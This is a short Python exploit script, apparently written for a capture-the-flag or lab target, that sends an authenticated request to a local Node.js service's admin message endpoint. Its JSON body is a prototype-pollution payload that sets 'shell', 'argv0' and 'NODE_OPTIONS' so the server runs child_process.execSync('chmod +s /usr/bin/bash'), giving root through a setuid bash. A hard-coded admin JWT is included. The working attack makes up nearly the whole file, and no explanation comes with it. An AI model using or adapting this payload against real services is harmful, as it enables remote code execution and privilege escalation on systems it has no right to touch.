#!/usr/bin/env python3

import requests

url = "http://127.0.0.1:3000"
path = "/admin/messages/send"
# path = "/auth/login"
headers = {
	"x-access-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MDQwNDQ5NCwiZXhwIjoxNjcwNDA4MDk0fQ.YGcidTb6aa8QBGzJcm_P7pA6aUhhZr1Z8zKOEYxZ2zA"
}

json = {
	"text": {
		"constructor": {
			"prototype": {
				"shell": "/proc/self/exe",
				"argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash\").toString())//",
				"NODE_OPTIONS":"--require /proc/self/cmdline"
			}
		}
	}
}

# json = {
# 	"username": "test",
# 	"password": "test"
# }

# json = {
# 	"text": "Hello, friend."
# }

r = requests.post(url+path, json=json, headers=headers)

print(r.text)